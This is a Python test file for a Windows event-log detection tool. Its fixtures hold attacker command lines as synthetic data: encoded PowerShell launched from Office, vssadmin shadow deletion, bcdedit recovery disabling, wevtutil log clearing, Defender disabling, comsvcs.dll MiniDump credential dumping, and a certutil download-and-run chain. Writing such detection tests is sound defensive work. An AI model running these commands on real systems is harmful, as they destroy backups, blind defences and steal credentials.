"""Exercise raw-evidence findings and nearby look-alikes."""
from datetime import datetime, timedelta, timezone
import json

import pytest

from sentinel.detection.windows_review import windows_findings
from sentinel.features import extract_features
from sentinel.ingest.windows_jsonl import parse_windows_jsonl

USER_TEMP = r"C:\Users\reviewer\AppData\Local\Temp\example.exe"
SYSTEM = "C:\\Windows\\System32\\"
OFFICE = "C:\\Program Files\\Office\\"
START = datetime(2026, 1, 2, 3, tzinfo=timezone.utc)


def event(seconds, code, **fields):
    return {"EventID": code, "TimeCreated": (START + timedelta(seconds=seconds)).isoformat(),
            "Computer": "workstation", "SubjectUserName": "operator"} | fields


def process(seconds, image, command, parent=None, **fields):
    return event(seconds, 4688, NewProcessName=image, CommandLine=command, ParentProcessName=parent, **fields)


def review(*rows):
    raw = "\n".join(json.dumps(row) for row in rows).encode()
    parsed = parse_windows_jsonl(raw, source_file="fixture.jsonl", upload_id="rule-test")
    findings, reviewed = windows_findings(extract_features(parsed.events))
    indices = {record.event_id: record.record_index for record in parsed.events}
    return [(f["title"], f["severity"], [indices[i] for i in f["finding"]["evidence_event_ids"]])
            for f in findings], reviewed


def test_office_attachment_requires_linked_shell_and_script_arguments_are_not_flags():
    attachment = process(1, OFFICE + "WINWORD.EXE", r'winword.exe "C:\Mail\example.docm"', OFFICE + "outlook.exe")
    editor = process(2, SYSTEM + "notepad.exe", "notepad.exe", SYSTEM + "explorer.exe")
    cmd = process(3, SYSTEM + "cmd.exe", 'cmd.exe /c powershell -EncodedCommand QUJDREVGR0hJSktM',
                  OFFICE + "WINWORD.EXE")
    routine = process(4, SYSTEM + "powershell.exe",
                      r'powershell.exe -ExecutionPolicy Bypass -File C:\Ops\approved.ps1 -enc QUJDREVGR0hJSktM')
    findings, checked = review(attachment, editor, cmd, routine)
    assert checked == 4
    assert findings == [("Office launched an encoded shell", "warning", [1, 3])]
    assert review(attachment, editor, routine)[0] == []


@pytest.mark.parametrize("image,command", [
    (r"C:\Program Files\PowerShell\7\pwsh.exe",
     r'"C:\Program Files\PowerShell\7\pwsh.exe" -EncodedCommand QUJDREVGR0hJSktM'),
    (SYSTEM + "cmd.exe", r'cmd.exe /C "C:\Program Files\PowerShell\7\pwsh.exe" -EncodedCommand QUJDREVGR0hJSktM'),
    (SYSTEM + "cmd.exe", r'cmd.exe /D /S /C ""C:\Program Files\PowerShell\7\pwsh.exe" -EncodedCommand QUJDREVGR0hJSktM"'),
])
def test_direct_or_quoted_office_shell_links_to_matching_attachment(image, command):
    attachment = process(1, OFFICE + "WINWORD.EXE", r'winword.exe "C:\Mail\example.docm"', OFFICE + "outlook.exe",
                         NewProcessId="0x100")
    shell = process(2, image, command, OFFICE + "WINWORD.EXE", ProcessId=256)
    assert review(attachment, shell)[0] == [("Office launched an encoded shell", "warning", [1, 2])]
    assert review(attachment, shell | {"ProcessId": 257})[0] == [("Office launched an encoded shell", "warning", [2])]
    quoted_text = process(3, SYSTEM + "cmd.exe",
                          r'cmd.exe /c echo "pwsh.exe -EncodedCommand QUJDREVGR0hJSktM"', OFFICE + "WINWORD.EXE")
    assert review(attachment, quoted_text)[0] == []


@pytest.mark.parametrize("command", [
    r'cmd.exe /S /C "echo pwsh.exe -EncodedCommand QUJDREVGR0hJSktM"',
    r'cmd.exe /S /C ""C:\Program Files\PowerShell\7\pwsh.exe" -File C:\Ops\report.ps1 -enc QUJDREVGR0hJSktM"',
    r'cmd.exe /S /C "pwsh.exe -NoProfile & echo -enc QUJDREVGR0hJSktM"',
])
def test_cmd_options_do_not_treat_text_or_script_arguments_as_encoded_launch(command):
    assert review(process(1, SYSTEM + "cmd.exe", command, OFFICE + "EXCEL.EXE"))[0] == []


@pytest.mark.parametrize(("image", "arguments", "read_only"), [
    ("vssadmin.exe", "delete shadows /quiet", "list shadows"),
    ("bcdedit.exe", "/set {default} recoveryenabled no", "/enum all"),
    ("wevtutil.exe", "clear-log Security", "get-log Security"),
    ("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true", "Get-MpPreference"),
    ("rundll32.exe", r'C:\Windows\System32\comsvcs.dll, MiniDump 42 C:\Temp\example.dmp full', r'C:\Tools\custom-comsvcs.dll, MiniDump 42'),
])
def test_tampering_pattern_is_critical_and_bound_to_expected_image(image, arguments, read_only):
    active = process(0, SYSTEM + image, f"{image} {arguments}")
    benign = process(1, SYSTEM + image, f"{image} {read_only}")
    wrong = process(2, SYSTEM + image, f"notepad.exe {arguments}")
    findings, checked = review(active, benign, wrong)
    assert checked == 2
    assert [(severity, rows) for _, severity, rows in findings] == [("critical", [1])]


@pytest.mark.parametrize(("overrides", "seconds", "linked"), [
    ({}, 7, True),
    ({"Computer": "other-host"}, 7, False),
    ({"SubjectUserName": "other-operator"}, 7, False),
    ({"ProcessId": 999}, 7, False),
    ({}, 1260, False),
])
def test_downloaded_parent_link_uses_host_account_time_and_available_pid(overrides, seconds, linked):
    download = process(1, SYSTEM + "certutil.exe", f'certutil.exe -urlcache -f https://example.test/a "{USER_TEMP}"')
    launch = process(3, USER_TEMP, f'"{USER_TEMP}"', NewProcessId="0x4a")
    discovery = process(seconds, SYSTEM + "whoami.exe", "whoami /priv", USER_TEMP, ProcessId=74) | overrides
    findings, checked = review(download, launch, discovery)
    assert checked == 3
    assert [indices for _, _, indices in findings] == [[1], [1, 2]] + ([[2, 3]] if linked else [])


def test_task_and_explicit_credentials_lookalikes_need_matching_evidence():
    system_task = event(0, 4698, TaskContent=r'"C:\Program Files\Trusted\updater.exe" /quiet')
    xml = f'<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions><Exec><Command>{USER_TEMP}</Command></Exec></Actions></Task>'
    temp_task = event(1, 4698, EventData={"TaskContent": xml})
    malformed = event(2, 4698, TaskContent='<!DOCTYPE task><Task>')
    rdp = event(3, 4648, ProcessName=SYSTEM + "mstsc.exe", TargetUserName="operator", TargetServerName="other-host")
    findings, checked = review(system_task, temp_task, malformed, rdp)
    assert checked == 3
    assert findings == [("Scheduled task launches a user-writable executable", "warning", [2])]


def test_standalone_appdata_task_warns_with_complete_security_source():
    updater = r"C:\Users\reviewer\AppData\Roaming\Vendor\sync.exe"
    source = {"Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing"}
    task = event(1, 4698, TaskContent=f'"{updater}" /quiet', **source)
    installed = task | {"TaskContent": r'"C:\Program Files\Vendor\sync.exe" /quiet'}
    data_argument = task | {"TaskContent": f'"C:\\Program Files\\Vendor\\sync.exe" "{updater}"'}
    sparse = event(2, 4698, TaskContent=updater)
    assert review(task)[0] == [("Scheduled task targets a user profile executable", "warning", [1])]
    assert review(installed, data_argument, task | {"Channel": "Application"})[0] == []
    assert review(sparse)[0] == [("Scheduled task targets a user profile executable", "context", [1])]


def test_sparse_audit_clear_needs_corroboration_and_conflicting_provider_is_rejected():
    clear = process(0, SYSTEM + "wevtutil.exe", "wevtutil cl Security")
    sparse = event(1, 1102, Message="The audit log was cleared.")
    conflicting = event(2, 1102, LogName="Security", ProviderName="Microsoft-Windows-Security-Auditing",
                        Message="The audit log was cleared.")
    native = event(130, 1102, Channel="Security", Provider="Microsoft-Windows-Eventlog")
    assert review(sparse, conflicting) == ([], 0)
    findings, checked = review(clear, sparse, conflicting, native)
    assert checked == 3
    assert [(severity, indices) for _, severity, indices in findings] == [
        ("critical", [1]), ("critical", [1, 2]), ("critical", [4]),
    ]
